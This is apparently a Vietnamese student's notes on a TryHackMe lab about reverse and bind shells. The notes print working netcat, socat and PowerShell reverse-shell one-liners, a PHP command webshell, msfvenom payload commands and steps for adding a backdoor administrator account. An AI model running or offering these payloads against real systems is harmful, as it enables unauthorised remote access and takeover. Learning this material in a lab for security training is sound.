# What the Shell?

**Task 1: What is a shell?**

- ***shell*** là công cụ dùng để giao tiếp với môi trường dòng lệnh (CLI)

- Ví dụ, trên Linux, các chương trình như ***bash*** hoặc ***sh*** là shell, trong khi trên Windows, ***cmd.exe*** và ***Powershell*** đóng vai trò tương tự.

- Khi tấn công các hệ thống từ xa, đôi khi có thể lợi dụng các ứng dụng đang chạy (như máy chủ web) để thực thi mã tùy ý

- Mục tiêu là sử dụng quyền truy cập ban đầu này để có được shell chạy trên hệ thống mục tiêu.

- Có hai cách chính để đạt được điều này:

1. ***Reverse Shell***: Buộc máy chủ từ xa gửi kết nối shell về máy.

2. ***Bind Shell***: Mở một cổng trên máy chủ để kết nối và thực thi lệnh.

**Task 2: Tools**

- Để nhận ***reverse shell*** và gửi ***bind shell***, có thể sử dụng nhiều công cụ khác nhau. Dưới đây là một số công cụ phổ biến và cách chúng hoạt động:

1. ***Netcat***

- Netcat có thể thực hiện nhiều tác vụ mạng, bao gồm liệt kê banner và quan trọng hơn là nhận reverse shell hoặc kết nối đến bind shell trên hệ thống mục tiêu.

- Mặc dù shell từ Netcat thường không ổn định (dễ bị mất kết nối), nhưng có thể cải thiện bằng các kỹ thuật nâng cao.

2. ***Socat***

- Socat giống như Netcat nhưng mạnh mẽ hơn nhiều. Nó cung cấp các shell ổn định hơn và hỗ trợ nhiều tính năng phức tạp hơn.

- Tuy nhiên, Socat có hai nhược điểm:

    - Cú pháp phức tạp hơn.

    - Không được cài đặt sẵn trên hầu hết các hệ thống Linux.

- Cả Socat và Netcat đều có phiên bản ***.exe*** để sử dụng trên Windows.

3. ***Metasploit --multi/handler***

- Mô-đun ***exploit/multi/handler*** trong Metasploit Framework được sử dụng để nhận reverse shell. Nó cung cấp nhiều tùy chọn để cải thiện độ ổn định của shell.

- Đây cũng là cách duy nhất để tương tác với Meterpreter và xử lý các ***staged payloads***.

4. ***Msfvenom***

- Msfvenom là một công cụ độc lập trong Metasploit Framework, dùng để tạo các payload nhanh chóng. Nó có thể tạo nhiều loại payload, bao gồm reverse shell và bind shell.

5. ***Các tài nguyên khác***

- ***Payloads all the Things***: Một kho lưu trữ lớn chứa các payload shell bằng nhiều ngôn ngữ khác nhau.

- ***PentestMonkey Reverse Shell Cheatsheet***: Một tài liệu tham khảo phổ biến cho các reverse shell.

- ***Webshells trên Kali Linux***: Nhiều webshell được cài đặt sẵn trong thư mục ***/usr/share/webshells***.

- ***SecLists***: Kho lưu trữ chứa các danh sách từ và mã hữu ích để lấy shell.

**Task 3: Types of Shell**

Ở mức độ cơ bản, quan tâm đến hai loại shell chính khi khai thác mục tiêu: ***reverse shell*** và ***bind shell***.

1. ***Reverse Shell***

- Reverse shell xảy ra khi mục tiêu bị buộc thực thi mã kết nối ngược trở lại máy của kẻ tấn công. Trên máy tính kẻ tấn công, sử dụng công cụ như ***Netcat***, ***Socat*** hoặc ***Metasploit*** để thiết lập một trình nghe (listener) nhận kết nối này.

- Ưu điểm: Reverse shell giúp vượt qua các quy tắc tường lửa có thể chặn kết nối đến các cổng trên mục tiêu.

- Nhược điểm: Khi nhận shell từ một máy qua internet, cần cấu hình mạng để chấp nhận kết nối. 

2. ***Bind Shell***

- Bind shell xảy ra khi mã được thực thi trên mục tiêu khởi động một trình nghe (listener) và gắn trực tiếp shell vào một cổng trên mục tiêu. Sau đó, có thể kết nối đến cổng này từ xa để thực thi lệnh.

- Ưu điểm: Không yêu cầu cấu hình mạng

- Nhược điểm: Có thể bị chặn bởi tường lửa trên mục tiêu.

=> Nguyên tắc chung: 

Reverse shell thường dễ thực thi và gỡ lỗi hơn so với bind shell.

=> Reverse Shell example:

- Ở bên trái, có ***reverse shell listener*** - đây là thứ nhận kết nối. Bên phải là mô phỏng gửi ***reverse shell***. Trên thực tế, điều này có nhiều khả năng được thực hiện thông qua việc chèn mã vào một trang web từ xa hoặc thứ gì đó tương tự. Hình dung hình ảnh bên trái là máy tính của kẻ tấn công và hình ảnh bên phải là mục tiêu.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image.png?raw=true)

- Lưu ý rằng sau khi chạy lệnh bên phải, bên nghe sẽ nhận được kết nối. Khi lệnh ***whoami*** được chạy, thấy rằng lệnh đang với tư cách là người dùng mục tiêu. Điều quan trọng ở đây là kẻ tấn công đang lắng nghe máy tấn công của chính mình và gửi kết nối từ mục tiêu.

=> Bind Shell example: 

- ở bên trái là máy tính của kẻ tấn công, ở bên phải là mục tiêu mô phỏng. Để cải thiện mọi thứ một chút, lần này sử dụng mục tiêu Windows. Đầu tiên, khởi động trình nghe trên mục tiêu - lần này cũng yêu cầu thực thi ***cmd.exe***. Sau đó, khi trình nghe được thiết lập và chạy, kết nối từ máy kẻ tấn công tới cổng mới mở.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image1.png?raw=true)

=> điều này một lần nữa cho phép thực thi mã trên máy từ xa. Lưu ý rằng điều này không dành riêng cho Windows.

=> Điều quan trọng cần hiểu ở đây, kẻ tấn công đang lắng nghe mục tiêu, sau đó kết nối với mục tiêu đó bằng máy của họ.

- Shell có thể được chia thành hai loại: ***interactive*** (tương tác) và ***non-interactive*** (không tương tác).

1. ***Interactive shell***

- Loại shell này cho phép tương tác với các chương trình sau khi chúng được thực thi.

- Ví dụ: Khi kết nối SSH, một lời nhắc yêu cầu nhập thông tin đăng nhập. Đây là một chương trình tương tác, đòi hỏi một interactive shell để hoạt động

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image2.png?raw=true)

2. ***Non-Interactive Shell***

- Non-interactive shell không cho phép tương tác trực tiếp với người dùng. Chỉ có thể chạy các chương trình không yêu cầu đầu vào từ người dùng.

- Hầu hết các reverse shell và bind shell đơn giản đều là non-interactive, điều này có thể làm cho việc khai thác trở nên phức tạp hơn.

- Ví dụ: Trong một non-interactive shell, lệnh ***whoami*** (không cần tương tác) sẽ chạy bình thường, nhưng lệnh ***ssh*** (cần tương tác) sẽ không hoạt động. Đầu ra của các lệnh tương tác thường bị mất hoặc không hiển thị.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image3.png?raw=true)

**Task 4: Netcat**

- Netcat là một công cụ cơ bản nhưng cực kỳ hữu ích trong bộ công cụ của pentester, đặc biệt khi làm việc với các kết nối mạng. Có thể sử dụng Netcat để thiết lập reverse shell và bind shell.

**Reverse shell**

Reverse shell yêu cầu một shellcode và một listener (trình nghe) trên máy tấn công. Để khởi động một listener bằng Netcat trên Linux, sử dụng cú pháp sau:

    nc -lvnp <port-number>

***-l***: Chỉ định Netcat sẽ hoạt động như một listener.

***-v***: Hiển thị đầu ra chi tiết (verbose).

***-n***: Không phân giải tên máy chủ hoặc sử dụng DNS.

***-p***: Chỉ định cổng mà listener sẽ lắng nghe.

Có thể sử dụng bất kỳ cổng nào chưa được sử dụng. Các cổng phổ biến như 80, 443, hoặc 53 thường dễ vượt qua tường lửa.

=> Sau khi khởi động listener, có thể kết nối từ mục tiêu bằng các payload phù hợp.

**Bind shell**

Bind shell yêu cầu một listener đang chạy trên mục tiêu. Để kết nối đến bind shell từ máy tấn công, sử dụng cú pháp:

    nc <target-ip> <chosen-port>

***< target-ip >***: Địa chỉ IP của mục tiêu.

***< chosen-port >***: Cổng mà bind shell đang lắng nghe.

**Task 5: Netcat Shell Stabilisation**

Các shell Netcat mặc định thường không ổn định. Chúng dễ bị gián đoạn bởi tổ hợp ***Ctrl + C***, không tương tác và thường gặp lỗi định dạng. Điều này xảy ra vì các shell Netcat thực chất là các tiến trình chạy trong terminal chứ không phải là terminal thực sự. 

***Technique 1: Python***

Kỹ thuật này chỉ áp dụng cho các hệ thống Linux, vì Python thường được cài đặt sẵn. Quy trình gồm ba bước:

1. ***Tạo shell tương tác bằng Python***:

        python -c 'import pty; pty.spawn("/bin/bash")'

- Nếu cần, thay python bằng python2 hoặc python3 tùy phiên bản Python trên mục tiêu.

- Shell lúc này sẽ tốt hơn, nhưng vẫn chưa hỗ trợ tự động hoàn thành (tab) hoặc các phím mũi tên.

2. ***Thiết lập biến môi trường TERM***: 

        export TERM=xterm

- Điều này cho phép sử dụng các lệnh terminal như ***clear***.

3. ***Đưa shell vào nền và khôi phục***:

- Nhấn ***Ctrl + Z*** để đưa shell vào nền.

- Trên terminal, chạy lệnh:

        stty raw -echo; fg

- Lệnh này tắt tiếng vang (echo) và đưa shell trở lại tiền cảnh, giúp shell ổn định hơn.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image4.png?raw=true)

***Lưu ý***: Nếu shell bị gián đoạn, đầu vào terminal có thể không hiển thị. Để khắc phục, chạy lệnh ***reset*** và nhấn Enter.

***Technique 2: rlwrap***

***rlwrap*** là công cụ giúp thêm tính năng tự động hoàn thành (tab), lịch sử lệnh và hỗ trợ phím mũi tên. Tuy nhiên, để sử dụng ***Ctrl + C***, vẫn cần áp dụng thêm các bước ổn định thủ công.

1. ***Cài đặt rlwrap*** (nếu chưa có):

        sudo apt install rlwrap

2. ***Khởi động listener với rlwrap***:

        rlwrap nc -lvnp <port>

3. ***Ổn định shell*** (nếu cần):

- Đưa shell vào nền bằng Ctrl + Z.

- Chạy lệnh:

        stty raw -echo; fg

***Technique 3: Socat***

Socat cung cấp shell ổn định hơn Netcat. Tuy nhiên, kỹ thuật này chỉ áp dụng cho hệ thống Linux.

1. ***Chuyển tệp nhị phân Socat đến mục tiêu***:

- Trên máy tấn công, khởi động máy chủ web:

        sudo python3 -m http.server 80

- Trên mục tiêu, tải xuống Socat:

        wget <LOCAL-IP>/socat -O /tmp/socat
    
    hoặc: 

        curl <LOCAL-IP>/socat -o /tmp/socat

2. ***Cấp quyền thực thi và chạy Socat***:

        chmod +x /tmp/socat
        /tmp/socat <options>

Lưu ý: Trên Windows, có thể sử dụng Powershell để tải xuống Socat:

    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows\Temp\socat.exe

***Thay đổi kích thước TTY***

Để sử dụng các trình soạn thảo văn bản hoặc chương trình yêu cầu kích thước terminal chính xác, cần điều chỉnh kích thước TTY.

1. ***Lấy kích thước terminal hiện tại***:

- Trên terminal, chạy:

        stty -a

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image5.png?raw=true)

- Ghi lại giá trị của rows và cols.

2. ***Thiết lập kích thước trên reverse/bind shell***:

        stty rows <number>
        stty cols <number>

- Thay < number > bằng giá trị tương ứng từ lệnh ***stty -a***.

**Task 6: Socat**

Socat tương tự Netcat ở một số khía cạnh nhưng lại khác biệt. Cách dễ nhất để hiểu Socat là nó hoạt động như một "cầu nối" giữa hai điểm. Trong ngữ cảnh này, hai điểm đó có thể là một cổng nghe và bàn phím, một cổng nghe và tệp, hoặc thậm chí hai cổng nghe. Socat kết nối hai điểm này lại với nhau.

**Reverse Shells**

Cú pháp của Socat phức tạp hơn so với Netcat. Dưới đây là cú pháp cơ bản để thiết lập một listener cho reverse shell:

    socat TCP-L:<port> -

=> Lệnh này tạo một listener trên cổng được chỉ định và kết nối nó với đầu vào tiêu chuẩn (stdin). Shell tạo ra không ổn định nhưng hoạt động trên cả Linux và Windows, tương đương với       
        
        nc -lvnp <port>

*Kết nối từ Windows*:

    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

Tùy chọn pipes buộc PowerShell (hoặc cmd.exe) sử dụng đầu vào và đầu ra tiêu chuẩn theo kiểu Unix.

*Kết nối từ Linux*:

    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

**Bind Shells**

*Trên mục tiêu Linux*:

    socat TCP-L:<PORT> EXEC:"bash -li"

*Trên mục tiêu Windows*:

    socat TCP-L:<PORT> EXEC:powershell.exe,pipes

Tùy chọn pipes giúp xử lý đầu vào và đầu ra giữa Unix và Windows CLI.

*Kết nối từ máy tấn công*:

    socat TCP:<TARGET-IP>:<TARGET-PORT> -

**Ổn định Shell TTY với Socat**

Một trong những ứng dụng mạnh mẽ nhất của Socat là tạo một reverse shell TTY hoàn toàn ổn định trên Linux. Kỹ thuật này chỉ hoạt động trên mục tiêu Linux.

*Listener trên máy tấn công*:

    socat TCP-L:<port> FILE:'tty',raw,echo=0

Lệnh này kết nối một cổng nghe với TTY hiện tại và tắt tiếng vang (echo). Nó tương đương với việc sử dụng Ctrl + Z, stty raw -echo; fg trong Netcat, nhưng ổn định ngay lập tức và kết nối với một TTY đầy đủ.

*Kết nối từ mục tiêu*:

    socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

=> Trong đó: 

- ***TCP:< attacker-ip >:< attacker-port >***: Kết nối đến listener trên máy tấn công.

- ***EXEC:"bash -li"***: Tạo một phiên bash tương tác.

- ***pty***: Cấp phát một thiết bị đầu cuối giả (pseudo-terminal) trên mục tiêu.

- ***stderr***: Đảm bảo thông báo lỗi được hiển thị trong shell.

- ***sigint***: Chuyển lệnh Ctrl + C vào tiến trình con, cho phép hủy lệnh trong shell.

- ***setsid***: Tạo tiến trình trong một phiên mới.

- ***sane***: Ổn định thiết bị đầu cuối, cố gắng "bình thường hóa" nó.

Ví dụ mô phỏng, ở bên trái, một trình lắng nghe đang chạy trên máy tấn công cục bộ, ở bên phải một mô phỏng về một mục tiêu bị xâm phạm, chạy với một lớp vỏ không tương tác. Sử dụng shell netcat không tương tác, thực thi lệnh socat đặc biệt và nhận shell bash tương tác đầy đủ trên trình nghe socat ở bên trái:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image6.png?raw=true)

**Lưu ý**

Socat thường không được cài đặt sẵn trên các hệ thống. Có thể tải lên một tệp nhị phân Socat đã biên dịch sẵn và thực thi nó trên mục tiêu.

Để tải Socat lên mục tiêu, sử dụng máy chủ web trên máy tấn công:

    sudo python3 -m http.server 80

Trên mục tiêu Linux, tải Socat bằng:

    wget <LOCAL-IP>/socat -O /tmp/socat

Trên mục tiêu Windows, sử dụng Powershell:

    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows\Temp\socat.exe

**Task 7: Socat Encrypted Shells**

Một trong những tính năng tuyệt vời của Socat là khả năng tạo các shell được mã hóa - cả reverse shell và bind shell. Shell được mã hóa không thể bị theo dõi trừ khi có khóa giải mã, giúp chúng vượt qua được các hệ thống phát hiện xâm nhập (IDS).

**Tạo Chứng Chỉ**

Để sử dụng shell được mã hóa, trước tiên cần tạo một chứng chỉ SSL. Cách dễ nhất để làm điều này là trên máy tấn công:

1. Tạo khóa và chứng chỉ:

    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

- Lệnh này tạo một khóa RSA 2048 bit và chứng chỉ tự ký có hiệu lực trong 362 ngày.

- Sẽ có yêu cầu nhập thông tin về chứng chỉ. Có thể để trống hoặc điền ngẫu nhiên.

2. Hợp nhất khóa và chứng chỉ thành tệp .pem:

    cat shell.key shell.crt > shell.pem

**Reverse Shell được mã hóa**

*Listener trên máy tấn công*:

    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

- Lệnh này thiết lập một listener sử dụng SSL với chứng chỉ đã tạo.

- verify=0 tắt xác thực chứng chỉ từ phía máy tấn công.

*Kết nối từ mục tiêu*:

    socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

- Lệnh này kết nối đến listener được mã hóa và khởi chạy một shell bash.

**Bind Shell được mã hóa**

*Listener trên mục tiêu*:

Linux: 

    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:/bin/bash

Windows: 

    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

- Tùy chọn pipes giúp xử lý đầu vào và đầu ra giữa Unix và Windows CLI.

*Kết nối từ máy tấn công*:

    socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

Lưu ý:

- Chứng chỉ (tệp .pem) phải được sử dụng trên cả máy tấn công và mục tiêu khi thiết lập listener.

- Để sao chép tệp .pem lên mục tiêu, có thể sử dụng máy chủ web trên máy tấn công:

        sudo python3 -m http.server 80

- Trên mục tiêu, tải tệp .pem bằng:

    Linux: 

        wget <LOCAL-IP>/shell.pem -O /tmp/shell.pem
    
    Windows: 

        Invoke-WebRequest -uri <LOCAL-IP>/shell.pem -outfile C:\Windows\Temp\shell.pem

Hình ảnh sau đây hiển thị shell OPENSSL Reverse từ mục tiêu Linux. Như thường lệ, mục tiêu ở bên phải và kẻ tấn công ở bên trái:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image7.png?raw=true)

**Task 8: Common Shell Payloads**

Xem xét một số payload phổ biến sử dụng các công cụ đã đề cập trước đó.

**Netcat Bind Shell**

Trong một số phiên bản Netcat (bao gồm cả phiên bản Windows nc.exe có trong Kali tại /usr/share/windows-resources/binaries và phiên bản netcat-traditional trên Kali), có tùy chọn -e cho phép thực thi một tiến trình khi kết nối được thiết lập.

*Listener trên mục tiêu*:

    nc -lvnp <PORT> -e /bin/bash

Kết nối đến listener này bằng Netcat sẽ tạo một bind shell trên mục tiêu.

*Reverse Shell*:

    nc <LOCAL-IP> <PORT> -e /bin/bash

Lệnh này tạo một reverse shell trên mục tiêu.

Lưu ý: Tùy chọn -e không có sẵn trong hầu hết các phiên bản Netcat hiện đại vì nó được coi là không an toàn. Tuy nhiên, nó vẫn hoạt động trên Windows.

**Netcat Bind Shell trên Linux (Không dùng -e)**:

Trên Linux, có thể sử dụng lệnh sau để tạo bind shell mà không cần tùy chọn -e:

    mkfifo /tmp/f; nc -lvnp <PORT> </tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image8.png?raw=true)

Giải thích:

- mkfifo /tmp/f: Tạo một đường ống có tên tại /tmp/f.

- nc -lvnp < PORT > < /tmp/f: Khởi động Netcat listener và kết nối đầu vào của nó với đường ống.

- /bin/sh >/tmp/f 2>&1: Đầu ra của Netcat (các lệnh được gửi) được chuyển đến shell (sh), và đầu ra của shell được gửi trở lại đường ống.

- rm /tmp/f: Xóa đường ống sau khi kết thúc.

**Netcat Reverse Shell trên Linux (Không dùng -e)**:

Tương tự, để tạo reverse shell:

    mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

Lệnh này tương tự như trên, nhưng sử dụng cú pháp kết nối thay vì lắng nghe.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image9.png?raw=true)

**PowerShell Reverse Shell**

Trên các máy chủ Windows hiện đại, việc sử dụng PowerShell reverse shell rất phổ biến. Dưới đây là một payload PowerShell reverse shell tiêu chuẩn:

    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Cách sử dụng:

- Thay thế < IP > và < PORT > bằng địa chỉ IP và cổng của máy tấn công.

- Sao chép và dán lệnh vào cmd.exe hoặc một phương thức thực thi lệnh khác trên máy chủ Windows (ví dụ: webshell).

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image10.png?raw=true)

**Tài nguyên bổ sung**

PayloadsAllTheThings: Một kho lưu trữ chứa nhiều loại payload shell (thường ở định dạng một dòng) bằng nhiều ngôn ngữ khác nhau.

**Task 9: msfvenom**

Msfvenom là công cụ trung tâm trong Metasploit Framework, được sử dụng để tạo các payload như reverse shell và bind shell. Nó cũng được dùng để tạo shellcode trong quá trình phát triển khai thác, chẳng hạn như khai thác tràn bộ đệm. Ngoài ra, msfvenom có thể tạo payload ở nhiều định dạng khác nhau (ví dụ: .exe, .aspx, .war, .py).

**Cú pháp cơ bản của Msfvenom**

Cú pháp chung của msfvenom như sau:

    msfvenom -p <PAYLOAD> <OPTIONS>

Ví dụ, để tạo một Windows x64 Reverse Shell ở định dạng .exe:

    msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image11.png?raw=true)

- -p <PAYLOAD>: Chỉ định loại payload (ví dụ: windows/x64/shell/reverse_tcp).

- -f <format>: Chỉ định định dạng đầu ra (ví dụ: exe).

- -o <file>: Chỉ định tên và vị trí lưu file đầu ra.

- LHOST=<IP>: Địa chỉ IP mà payload sẽ kết nối lại (thường là địa chỉ IP của máy tấn công).

- LPORT=<port>: Cổng mà payload sẽ kết nối lại (cổng trên máy tấn công).

**Staged vs Stageless Payloads**

*Staged Payloads*:

Đặc điểm:

- Chia làm hai phần: stager và stage.

    - Stager: Một đoạn mã nhỏ được thực thi trên mục tiêu, kết nối với listener và tải xuống stage (phần chứa shell thực tế).

    - Stage: Phần shell đầy đủ được tải xuống và thực thi trong bộ nhớ, không chạm vào đĩa.

Ưu điểm:

- Kích thước ban đầu nhỏ, khó bị phát hiện bởi phần mềm chống virus.

Nhược điểm:

- Yêu cầu một listener đặc biệt (thường là exploit/multi/handler trong Metasploit).

*Stageless Payloads*:

Đặc điểm:

- Chứa toàn bộ shell trong một payload duy nhất.

- Khi được thực thi, nó ngay lập tức gửi shell về listener.

Ưu điểm:

- Dễ sử dụng và không yêu cầu listener đặc biệt.

Nhược điểm:

- Kích thước lớn hơn, dễ bị phát hiện bởi phần mềm chống virus.


**Meterpreter**

Meterpreter là một loại shell đầy đủ tính năng của Metasploit, đặc biệt hữu ích khi làm việc với các mục tiêu Windows.

Ưu điểm:

- Ổn định và cung cấp nhiều tính năng như tải lên/tải xuống file, chạy lệnh hệ thống, v.v.

- Được tích hợp sẵn trong Metasploit Framework.

Nhược điểm:

- Phải được bắt bởi Metasploit (exploit/multi/handler).

**Quy ước đặt tên Payload**

Msfvenom sử dụng quy ước đặt tên payload như sau:

    <OS>/<arch>/<payload>

Ví dụ:

- linux/x86/shell_reverse_tcp: Tạo một stageless reverse shell cho Linux x86.

- windows/shell_reverse_tcp: Tạo một stageless reverse shell cho Windows 32-bit (không cần chỉ định kiến trúc).

- windows/x64/meterpreter/reverse_tcp: Tạo một staged Meterpreter reverse shell cho Windows 64-bit.

**Phân biệt Staged và Stageless**:

- Stageless: Được biểu thị bằng dấu gạch dưới (_), ví dụ: shell_reverse_tcp.

- Staged: Được biểu thị bằng dấu gạch chéo (/), ví dụ: shell/reverse_tcp.

**Liệt kê các Payload có sẵn**

Để xem danh sách tất cả các payload có sẵn trong msfvenom, sử dụng lệnh:

    msfvenom --list payloads

Điều này có thể được sử dụng để liệt kê tất cả các tải trọng có sẵn, sau đó có thể được chuyển vào grep để tìm kiếm một tập hợp tải trọng cụ thể. Ví dụ:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image12.png?raw=true)

**Task 10: Metasploit multi/handler**

Multi/Handler là một công cụ mạnh mẽ trong Metasploit Framework, được sử dụng để bắt các reverse shell. Nó là lựa chọn lý tưởng khi làm việc với Meterpreter shell hoặc các staged payloads.

**Cách sử dụng Multi/Handler**

Khởi động Metasploit:

    msfconsole

Chọn module multi/handler:

    use multi/handler

Xem các tùy chọn có sẵn:

    options

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image13.png?raw=true)

Thiết lập các tùy chọn cần thiết:

- PAYLOAD: Loại payload muốn sử dụng (ví dụ: windows/x64/meterpreter/reverse_tcp).

- LHOST: Địa chỉ IP mà listener sẽ lắng nghe.

- LPORT: Cổng mà listener sẽ lắng nghe.

Khởi động listener:

    exploit -j

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image14.png?raw=true)

Lệnh này khởi chạy listener ở chế độ nền.

Khi tải trọng theo giai đoạn được tạo trong tác vụ trước được chạy, Metasploit sẽ nhận được kết nối, gửi phần còn lại của tải trọng và cung cấp  một reverse shell:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image15.png?raw=true)

Lưu ý:

- Quyền root: Nếu sử dụng cổng dưới 1024, cần chạy Metasploit với quyền sudo.

- Quản lý phiên: 

    - Để xem các phiên đang hoạt động, sử dụng lệnh:

            sessions
    
    - Để chuyển một phiên cụ thể sang chế độ tiền cảnh, sử dụng:

            sessions <session-number>
    
    - Ví dụ: Nếu nhận được thông báo "Command Shell session 1 opened", có thể chuyển sang phiên đó bằng:

            sessions 1

**Task 11: WebShells**

Khi gặp các trang web cho phép tải lên tệp, có thể tận dụng cơ hội này để tải lên webshell. Webshell là một tập lệnh chạy trên máy chủ web (thường bằng PHP hoặc ASP) để thực thi lệnh từ xa. Nó hữu ích khi không thể tải lên reverse shell hoặc bind shell trực tiếp.

**Webshell cơ bản bằng PHP**

    <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

Cách hoạt động:

- Tham số cmd trong URL được thực thi bằng shell_exec().

- Kết quả được trả về và hiển thị trên trang web.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image16.png?raw=true)

**Webshell trên Kali Linux**

Kali Linux cung cấp nhiều webshell mẫu tại /usr/share/webshells, bao gồm:

- PHP Reverse Shell: Một reverse shell hoàn chỉnh bằng PHP (ví dụ: php-reverse-shell.php).

- Lưu ý: Các webshell này thường được viết cho hệ thống Unix (Linux) và có thể không hoạt động trên Windows.

**Webshell trên Windows**

Đối với mục tiêu Windows, có thể sử dụng PowerShell Reverse Shell được mã hóa URL. Ví dụ:

    powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

Cách sử dụng:

- Thay thế < IP > và < PORT > bằng địa chỉ IP và cổng của máy tấn công.

- Dán vào tham số cmd trong URL để thực thi.

**Task 12: Next Steps**

Các shell reverse và bind thường không ổn định và không tương tác đầy đủ. Để cải thiện điều này, cần tìm cách chuyển sang các phương pháp truy cập "bình thường" hơn, chẳng hạn như SSH trên Linux hoặc RDP trên Windows.

**Trên Linux**

Tìm kiếm thông tin xác thực:

- Kiểm tra thư mục /home/< user>/.ssh để tìm khóa SSH.

- Tìm kiếm thông tin đăng nhập trong các tệp cấu hình hoặc lịch sử.

Khai thác lỗ hổng để leo thang đặc quyền:

- Sử dụng các lỗ hổng như Dirty COW để ghi đè lên tệp /etc/passwd hoặc /etc/shadow.

- Thêm tài khoản người dùng mới hoặc thay đổi mật khẩu của người dùng hiện có.

Sử dụng SSH:

- Nếu SSH đang mở, sử dụng thông tin đăng nhập hoặc khóa SSH để kết nối.

**Trên Windows**

Tìm kiếm thông tin xác thực:

- Kiểm tra sổ đăng ký (Registry) để tìm mật khẩu dịch vụ, chẳng hạn như VNC hoặc FTP.

- Ví dụ: FileZilla Server lưu thông tin đăng nhập trong tệp C:\Program Files\FileZilla Server\FileZilla Server.xml.

Thêm tài khoản người dùng:

- Nếu có quyền quản trị viên, thêm tài khoản mới và đưa vào nhóm Administrators:

        net user <username> <password> /add
        net localgroup Administrators <username> /add

Sử dụng các dịch vụ truy cập từ xa:

- Đăng nhập qua RDP, telnet, winexe, psexec, hoặc WinRM tùy thuộc vào dịch vụ đang chạy.

**Điểm quan trọng**

- Reverse Shell và Bind Shell là kỹ thuật cơ bản để thực thi mã từ xa, nhưng chúng không ổn định và thiếu tính năng so với shell gốc.

- Mục tiêu cuối cùng: Chuyển sang các phương pháp truy cập "bình thường" như SSH hoặc RDP để dễ dàng khai thác và quản lý mục tiêu hơn.

**Task 13: Practical and Examples**

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image17.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image18.png?raw=true)

Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells

